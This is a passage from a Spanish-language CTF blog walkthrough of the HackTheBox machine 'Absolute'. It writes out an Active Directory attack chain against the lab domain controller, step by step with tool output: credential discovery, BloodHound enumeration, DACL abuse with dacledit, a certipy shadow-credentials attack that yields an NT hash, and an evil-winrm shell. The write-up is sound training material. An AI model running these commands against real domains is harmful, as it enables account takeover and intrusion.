SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
</code></pre></div></div>

<h2 id="svc_smb">svc_smb</h2>

<ul>
  <li>Como por <code class="language-plaintext highlighter-rouge">kerberos</code> las credenciales son correctas podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code> recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.181    445    DC               Share           Permissions     Remark
SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.181    445    DC               Shared
SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Bueno no hay nada interesante algo que podemos hacer es usar el protocolo <code class="language-plaintext highlighter-rouge">ldap</code> para enumerar usuarios del dominio mediante al autenticación de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--users</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.10.11.181    389    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
LDAP        10.10.11.181    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 20
LDAP        10.10.11.181    389    DC               Administrator                  Built-in account <span class="k">for </span>administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest                          Built-in account <span class="k">for </span>guest access to the computer/domain
LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.181    389    DC               J.Roberts
LDAP        10.10.11.181    389    DC               M.Chaffrey
LDAP        10.10.11.181    389    DC               D.Klay
LDAP        10.10.11.181    389    DC               s.osvald
LDAP        10.10.11.181    389    DC               j.robinson
LDAP        10.10.11.181    389    DC               n.smith
LDAP        10.10.11.181    389    DC               m.lovegod
LDAP        10.10.11.181    389    DC               l.moore
LDAP        10.10.11.181    389    DC               c.colt
LDAP        10.10.11.181    389    DC               s.johnson
LDAP        10.10.11.181    389    DC               d.lemm
LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.10.11.181    389    DC               svc_audit
LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
</code></pre></div></div>

<ul>
  <li>Tenemos nuevas credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D.Klay:Darkmoonsky248girl
svc_smb:AbsoluteSMBService123!
</code></pre></div></div>

<ul>
  <li>Si las revisamos vemos que son correctas usando el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
</code></pre></div></div>

<h2 id="mlovegod">m.lovegod</h2>

<ul>
  <li>Podemos volver a listar recursos compartidos por el protocoló <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.181    445    DC               Share           Permissions     Remark
SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.181    445    DC               Shared          READ
SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos para ver que hay dentro de <code class="language-plaintext highlighter-rouge">shared</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient <span class="nt">-k</span> absolute.htb/svc_smb:<span class="s1">'AbsoluteSMBService123!'</span>@dc.absolute.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Shared</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 <span class="nb">.</span>
drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 ..
<span class="nt">-rw-rw-rw-</span>         72  Thu Sep  1 12:02:23 2022 compiler.sh
<span class="nt">-rw-rw-rw-</span>      67584  Thu Sep  1 12:02:23 2022 test.exe
</code></pre></div></div>

<ul>
  <li>Vamos a descargar los 2 archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading compiler.sh
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading test.exe
</code></pre></div></div>

<ul>
  <li>Tenemos un ejecutable y un script en <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content file test.exe
test.exe: PE32+ executable <span class="o">(</span>GUI<span class="o">)</span> x86-64 <span class="o">(</span>stripped to external PDB<span class="o">)</span>, <span class="k">for </span>MS Windows, 11 sections
➜  content <span class="nb">cat </span>compiler.sh
<span class="c">#!/bin/bash</span>

nim c <span class="nt">-d</span>:mingw <span class="nt">--app</span>:gui <span class="nt">--cc</span>:gcc <span class="nt">-d</span>:danger <span class="nt">-d</span>:strip <span class="nv">$1</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> la <code class="language-plaintext highlighter-rouge">IP</code> y dominios de la máquina victima.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/hosts.png" />
</p>

<ul>
  <li>Vamos correr la <code class="language-plaintext highlighter-rouge">VPN</code> de <code class="language-plaintext highlighter-rouge">HackTheBox</code> en la máquina <code class="language-plaintext highlighter-rouge">Windows</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/vpn.png" />
</p>

<ul>
  <li>
    <p>Ahora vamos a pasar el <code class="language-plaintext highlighter-rouge">.exe</code> a la máquina Windows.</p>
  </li>
  <li>
    <p>Como no sabemos que hace el <strong>.exe</strong> vamos a ponernos a interceptar el trafico con <code class="language-plaintext highlighter-rouge">Wireshark</code>.</p>
  </li>
  <li>
    <p>Al momento de ejecutar el binario y estar capturando con <code class="language-plaintext highlighter-rouge">Wireshark</code> encontramos credenciales.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/creds.png" />
</p>

<ul>
  <li>Nos dice que no son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'mlovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>lovegod: KDC_ERR_C_PRINCIPAL_UNKNOWN
</code></pre></div></div>

<ul>
  <li>Si les ponemos un punto funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb absolute.htb <span class="nt">-u</span> <span class="s1">'m.lovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
SMB         absolute.htb    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         absolute.htb    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\m</span>.lovegod:AbsoluteLDAP2022!
</code></pre></div></div>

<ul>
  <li>Para enumerar el <code class="language-plaintext highlighter-rouge">DC</code> vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content bloodhound-python <span class="nt">-u</span> m.lovegod <span class="nt">-p</span> AbsoluteLDAP2022! <span class="nt">-k</span> <span class="nt">-c</span> All <span class="nt">-d</span> absolute.htb <span class="nt">-dc</span> dc.absolute.htb <span class="nt">-ns</span> 10.10.11.181 <span class="nt">--zip</span>
INFO: Found AD domain: absolute.htb
INFO: Getting TGT <span class="k">for </span>user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 <span class="nb">users
</span>INFO: Found 55 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done <span class="k">in </span>00M 23S
INFO: Compressing output into 20240618211316_bloodhound.zip
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">sudo </span>neo4j start
Directories <span class="k">in </span>use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j <span class="o">(</span>pid:39754<span class="o">)</span><span class="nb">.</span> It is available at http://localhost:7474
There may be a short delay <span class="k">until </span>the server is ready.

➜  ~ bloodhound &amp;&gt; /dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>

<ul>
  <li>Vamos a marcar los usuarios que ya tenemos comprometidos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/klay.png" />
</p>

<ul>
  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Shortest Paths</code> y seleccionamos el usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> encontramos una forma de convertirnos en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/4.png" />
</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">m.lovegod</code> tiene el privilegio <code class="language-plaintext highlighter-rouge">owns</code> en el grupo <code class="language-plaintext highlighter-rouge">GenericWrite</code>.</li>
</ul>

<blockquote>
  <p>El privilegio “Owns” dentro del grupo “GenericWrite” le otorga al usuario la capacidad de modificar la mayoría de los atributos del objeto, administrar el objeto y delegar permisos a otros usuarios, con ciertas excepciones.</p>
</blockquote>

<ul>
  <li>El usuario el cual es nuestro objetivo es parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/5.png" />
</p>

<h2 id="mlovegod-to-network-audit">m.lovegod to Network Audit</h2>

<ul>
  <li>Estuve muchas horas tratando de solucionar los errores para empezar tuve que hacer los mismos pasos 3 veces para llegar a obtener el hash NT de <strong>winrm_user</strong> pero esto fue lo que hice.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /etc/resolv.conf
<span class="c"># Generated by NetworkManager</span>
nameserver 10.10.11.181
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> /usr/share/samba/setup/krb5.conf
<span class="o">[</span>libdefaults]
	default_realm <span class="o">=</span> ABSOLUTE.HTB
	dns_lookup_realm <span class="o">=</span> <span class="nb">false
	</span>dns_lookup_kdc <span class="o">=</span> <span class="nb">true</span>

<span class="o">[</span>realms]
<span class="k">${</span><span class="nv">REALM</span><span class="k">}</span> <span class="o">=</span> ABSOLUTE.HTB <span class="o">=</span> <span class="o">{</span>
		kdc <span class="o">=</span> dc.absolute.htb
		admin_server <span class="o">=</span> dc.absolute.htb
		default_domain <span class="o">=</span> absolute.htb
	  <span class="o">}</span>

<span class="o">[</span>domain_realm]
	<span class="k">${</span><span class="nv">HOSTNAME</span><span class="k">}</span> <span class="o">=</span> <span class="k">${</span><span class="nv">REALM</span><span class="k">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>En <code class="language-plaintext highlighter-rouge">bloodhound</code> nos dicen que podemos usar <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s</a> para agregar al usuario.</p>
  </li>
  <li>
    <p>También podemos hacerlo desde nuestra máquina Linux con los pasos que nos dicen en bloodhound.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/f.png" />
</p>

<ul>
  <li>
    <p><a href="https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py">https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py</a></p>
  </li>
  <li>
    <p><a href="https://github.com/ShutdownRepo/impacket.git">https://github.com/ShutdownRepo/impacket.git</a>.</p>
  </li>
  <li>
    <p>Ahora obtendremos control total del grupo Network Audit para el usuario m.lovegod.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 dacledit.py <span class="nt">-k</span> <span class="nt">-no-pass</span> absolute.htb/m.lovegod <span class="nt">-dc-ip</span> dc.absolute.htb <span class="nt">-principal</span> m.lovegod <span class="nt">-target</span> <span class="s2">"Network Audit"</span> <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL backed up to dacledit-20240619-000424.bak
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL modified successfully!
</code></pre></div></div>

<ul>
  <li>Ahora agregamos el usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content net rpc group addmem <span class="s2">"Network Audit"</span> m.lovegod <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
</code></pre></div></div>

<ul>
  <li>Comprobamos que el usuario esta en el grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content net rpc group members <span class="s2">"Network Audit"</span> <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
absolute<span class="se">\m</span>.lovegod
absolute<span class="se">\s</span>vc_audit
</code></pre></div></div>

<ul>
  <li>Ahora vamos a generar un TGT y lo exportamos como variable para después autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>m.lovegod.ccache
➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
</code></pre></div></div>

<ul>
  <li>En este punto deberíamos de tener <code class="language-plaintext highlighter-rouge">GenericWrite</code> en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code> podemos usar <code class="language-plaintext highlighter-rouge">certipy</code> para obtener el <code class="language-plaintext highlighter-rouge">TGT</code> del usuario <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad shadow auto <span class="nt">-u</span> absolute.htb/m.lovegod@dc.absolute.htb <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-target</span> dc.absolute.htb <span class="nt">-account</span> winrm_user
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'winrm_user'</span> with the certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: winrm_user@absolute.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'winrm_user.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>: 8738c7413a5da3bc1d083efc0ab06cb2
</code></pre></div></div>

<h2 id="winrm_user">winrm_user</h2>

<ul>
  <li>Ahora nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>winrm_user.ccache
➜  content evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
7db70aea6e4e1e5f4b858e1136fdc263
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>
    <p>Para enumerar el sistema podemos usar winpeas <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</a>.</p>
  </li>
  <li>
    <p>La máquina en lo persona falla demasiado así que tuve que hacer lo mismo varias veces hasta para ejecutar el <code class="language-plaintext highlighter-rouge">winPEASx64.exe</code>.</p>
  </li>
  <li>
    <p>Tenia mucho este error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc_consolidate<span class="o">()</span>: unaligned fastbin chunk detected
<span class="o">[</span>1]    109301 IOT instruction  evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Gatogamer_account/Absolute/content/winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/Absolute/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos que hacer esta explotación <a href="https://github.com/cube0x0/KrbRelay">https://github.com/cube0x0/KrbRelay</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/zi.png" />
</p>

<h2 id="ultima-parte">Ultima parte</h2>

<blockquote>
  <p>Como la máquina me esta dando demasiados errores la escalada de privilegios que consiste en hacer un KrbRelay la pueden encuntrar en el post de mi compañero <a href="https://xchg2pwn.github.io/hackthebox/absolute/">https://xchg2pwn.github.io/hackthebox/absolute/</a></p>
</blockquote>


  </div><a class="u-url" href="/hackthebox/machines/insane/2024/06/19/absolute.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
